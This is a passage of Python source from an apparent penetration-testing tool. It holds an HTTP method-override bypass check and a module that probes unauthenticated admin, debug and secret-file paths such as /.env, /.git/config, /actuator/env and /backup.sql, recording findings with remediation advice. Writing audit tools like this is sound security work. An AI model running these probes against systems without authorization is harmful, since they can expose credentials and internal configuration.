        # Baseline — direct actual verb (should be 405 or 403)
        baselines: dict[str, int] = {}
        for m in target_methods:
            try:
                r = requests.request(m, url, headers=req_headers,
                                     json=body, timeout=10, verify=verify)
                baselines[m] = r.status_code
                stream("info", f"Baseline {m}: HTTP {r.status_code}")
            except Exception:
                baselines[m] = -1

        for override_method in target_methods:
            for hdr in override_headers:
                try:
                    test_headers = {**req_headers, hdr: override_method}
                    if hdr == "_method":
                        # Form field override
                        r = requests.post(url, data={"_method": override_method, **(body or {})},
                                          headers=req_headers, timeout=10, verify=verify)
                    else:
                        r = requests.request(
                            base_method, url, headers=test_headers,
                            json=body, timeout=10, verify=verify,
                        )

                    stream("info", f"{hdr}: {override_method} → HTTP {r.status_code}")

                    baseline_blocked = baselines.get(override_method, 200) in (405, 403, 501)
                    method_worked = r.status_code in (200, 201, 204)

                    if method_worked and baseline_blocked:
                        stream("success", f"Method override bypass confirmed: {hdr}: {override_method}")
                        findings.append({
                            "title": f"HTTP Method Override — {hdr}: {override_method}",
                            "severity": "medium",
                            "url": url,
                            "description": (
                                f"The header '{hdr}: {override_method}' bypassed HTTP method restriction. "
                                f"Direct {override_method} returned HTTP {baselines.get(override_method)}, "
                                f"but override via POST returned HTTP {r.status_code}."
                            ),
                            "evidence": f"Header: {hdr}: {override_method}\nHTTP {r.status_code}\n{r.text[:300]}",
                            "remediation": (
                                "Do not honor X-HTTP-Method-Override/X-Method-Override headers. "
                                "Apply verb restrictions at the network/WAF level."
                            ),
                            "cwe_id": "CWE-650",
                        })

                except Exception as e:
                    stream("warning", f"Request failed ({hdr} {override_method}): {e}")

        stream("info", f"HTTP method override scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [AC-07] Missing Function-Level Authentication ────────────────────────────

class MissingFunctionAuthModule(BaseModule):
    id = "AC-07"
    name = "Missing Function-Level Auth"
    category = "access_control"
    description = (
        "Audit for endpoints that lack authentication by directly accessing admin, "
        "management, debug, and API paths without any auth token."
    )
    risk_level = "high"
    tags = ["missing-auth", "unprotected-endpoint", "admin-access", "ffuf", "owasp-a01"]
    celery_queue = "web_audit_queue"
    time_limit = 360

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="base_url",
            label="Base URL",
            field_type="url",
            required=True,
            placeholder="https://api.example.com",
        ),
        FieldSchema(
            key="path_list",
            label="Custom Path List to Test",
            field_type="textarea",
            required=False,
            placeholder="/admin\n/admin/users\n/api/v1/config\n/internal/status",
            help_text="One path per line. Leave empty to use built-in admin/debug wordlist.",
        ),
        FieldSchema(
            key="use_builtin_wordlist",
            label="Also use built-in admin/debug wordlist",
            field_type="toggle",
            default=True,
        ),
        FieldSchema(
            key="methods",
            label="HTTP Methods to Test",
            field_type="checkbox_group",
            default=["GET"],
            options=[
                {"value": "GET",    "label": "GET"},
                {"value": "POST",   "label": "POST"},
                {"value": "OPTIONS","label": "OPTIONS"},
            ],
        ),
        FieldSchema(
            key="auth_cookie",
            label="Auth Cookie (compare response — user auth vs none)",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
        ),
        FieldSchema(
            key="match_status_codes",
            label="Consider Accessible if HTTP Status",
            field_type="text",
            default="200,201,301,302",
            help_text="Comma-separated status codes to flag.",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    _BUILTIN_PATHS = [
        "/admin", "/admin/", "/admin/users", "/admin/settings", "/admin/config",
        "/admin/login", "/admin/panel", "/administrator", "/admin-panel",
        "/api/admin", "/api/v1/admin", "/api/v1/users", "/api/v1/config",
        "/api/internal", "/internal", "/internal/admin", "/internal/status",
        "/management", "/manage", "/debug", "/debug/vars", "/debug/pprof",
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
        "/actuator/beans", "/actuator/mappings", "/actuator/metrics",
        "/console", "/h2-console", "/phpinfo", "/phpinfo.php", "/status",
        "/server-status", "/server-info", "/swagger-ui", "/swagger-ui.html",
        "/api-docs", "/v2/api-docs", "/v3/api-docs", "/openapi.json",
        "/.env", "/.git/config", "/config.json", "/config.yml", "/app.config",
        "/web.config", "/wp-config.php.bak", "/backup.sql",
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        base = params["base_url"].rstrip("/")
        methods = params.get("methods", ["GET"])
        auth_cookie = params.get("auth_cookie", "")
        match_codes = [
            int(c.strip()) for c in params.get("match_status_codes", "200,201,301,302").split(",")
            if c.strip().isdigit()
        ]
        findings = []

        # Build path list
        custom_paths = [p.strip() for p in params.get("path_list", "").splitlines() if p.strip()]
        all_paths = custom_paths[:]
        if params.get("use_builtin_wordlist", True):
            all_paths += [p for p in self._BUILTIN_PATHS if p not in all_paths]

        stream("info", f"Testing {len(all_paths)} paths × {len(methods)} methods for missing auth")

        for path in all_paths:
            full_url = base + ("" if path.startswith("/") else "/") + path.lstrip("/")

            for method in methods:
                # Unauthenticated request
                try:
                    r_unauth = requests.request(
                        method, full_url,
                        headers={"User-Agent": "PenTools/MissingAuth"},
                        timeout=8, verify=verify, allow_redirects=False,
                    )
                except Exception:
                    continue

                if r_unauth.status_code not in match_codes:
                    continue

                stream("info", f"[unauth] {method} {path}: HTTP {r_unauth.status_code}")

                # If auth provided, compare: auth should also give 200, unauth should be 401/403
                if auth_cookie:
                    try:
                        r_auth = requests.request(
                            method, full_url,
                            headers={"User-Agent": "PenTools/MissingAuth", "Cookie": auth_cookie},
                            timeout=8, verify=verify, allow_redirects=False,
                        )
                        if r_unauth.status_code == r_auth.status_code:
                            # Both succeed — no auth enforcement
                            findings.append({
                                "title": f"Missing Auth — {method} {path}",
                                "severity": "high",
                                "url": full_url,
                                "description": (
                                    f"Endpoint {method} {path} returned HTTP {r_unauth.status_code} "
                                    f"both with and without authentication — no auth enforcement."
                                ),
                                "evidence": f"Unauth: HTTP {r_unauth.status_code}\nAuth: HTTP {r_auth.status_code}\nSnippet: {r_unauth.text[:200]}",
                                "remediation": "Enforce authentication and authorization on all endpoints via middleware.",
                                "cwe_id": "CWE-306",
                            })
                        # else: with auth → 200, without auth → 401/403 is correct behavior
                    except Exception:
                        pass
                else:
                    # No auth baseline available — just flag successful unauth access
                    severity = "high" if r_unauth.status_code == 200 else "low"
                    findings.append({
                        "title": f"Potentially Unprotected — {method} {path} (HTTP {r_unauth.status_code})",
                        "severity": severity,
                        "url": full_url,
                        "description": (
                            f"Unauthenticated request to {method} {path} returned HTTP {r_unauth.status_code}. "
                            f"Verify whether this endpoint requires authentication."
                        ),
                        "evidence": f"HTTP {r_unauth.status_code}\n{r_unauth.text[:200]}",
                        "remediation": "Apply authentication middleware globally; use allowlists for public endpoints.",
                        "cwe_id": "CWE-306",
                    })
                    stream("success", f"Potential missing auth: {method} {path} → HTTP {r_unauth.status_code}")

        stream("info", f"Missing function auth scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}
